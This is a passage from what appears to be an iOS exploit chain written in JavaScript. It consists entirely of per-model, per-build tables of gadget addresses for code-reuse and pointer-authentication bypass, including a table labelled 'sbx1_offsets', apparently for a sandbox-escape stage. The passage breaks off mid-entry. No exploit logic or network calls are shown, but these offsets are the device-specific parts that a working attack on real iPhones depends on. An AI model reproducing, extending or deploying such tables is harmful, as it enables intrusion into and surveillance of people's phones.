      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x26229a98cn,
      fcall_14_args_write_x8: 0x24cefc054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x26229a98cn,
      fcall_14_args_write_x8: 0x24cefc054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f8b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f11c2ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261ef698cn,
      fcall_14_args_write_x8: 0x24cef8054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb502cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f11c2ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261ef698cn,
      fcall_14_args_write_x8: 0x24cef8054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb502cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone17,5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1142ecn,
      tcall_X0LG: 0x21f281150n,
      tcall_RLG: 0x20dfce178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261c6098cn,
      fcall_14_args_write_x8: 0x24cef0054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23adad02cn,
      transformSurface_gadget: 0x2103ecb70n,
      xpac_gadget: 0x1b683ca08n
   }
};

    sbx1_offsets = {
   "iPhone11,2_4_6_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23abc402cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c605ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d4a98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef3e2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd46178n,
      tcall_X0LG: 0x21effe150n,
      transformSurface_gadget: 0x210164b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone11,8_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9002cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c5d1ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d3d98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef0a2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f002150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,1_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9002cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c615ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e2798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef0a2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f002150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,3_5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23ab9002cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c615ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260e2798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ef0a2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4a178n,
      tcall_X0LG: 0x21f002150n,
      transformSurface_gadget: 0x210168b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone12,8_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23aab602cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c531ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x260d7398cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ee2c2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f00a150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,1_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7f4ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2610ce98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed492ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f019150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,2_3_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7f8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26146998cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone13,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9d702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7f8ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26146998cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed4d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,2_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c838ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26182798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed192ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,3_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9a302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c838ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26182798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed192ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a99f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c834ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26149198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed152ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f019150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a99f02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c834ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26149198cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed152ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd4e178n,
      tcall_X0LG: 0x21f019150n,
      transformSurface_gadget: 0x21016cb70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,6_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a91b02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c7acea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26144098cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ec912ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd52178n,
      tcall_X0LG: 0x21f01d150n,
      transformSurface_gadget: 0x210170b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,7_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9b302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26184d98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed292ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02d150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone14,8_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9b302cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c848ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26184d98cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed292ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02d150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,2_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c891ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c4398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6a178n,
      tcall_X0LG: 0x21f035150n,
      transformSurface_gadget: 0x210188b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,3_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c891ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261c4398cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6a178n,
      tcall_X0LG: 0x21f035150n,
      transformSurface_gadget: 0x210188b70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone15,4_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c88dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618e798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone15,5_22G86": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c88dea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2618e798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f031150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone16,1_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d041ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26243b98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f039150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone16,2_22G86": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d041ea8n,
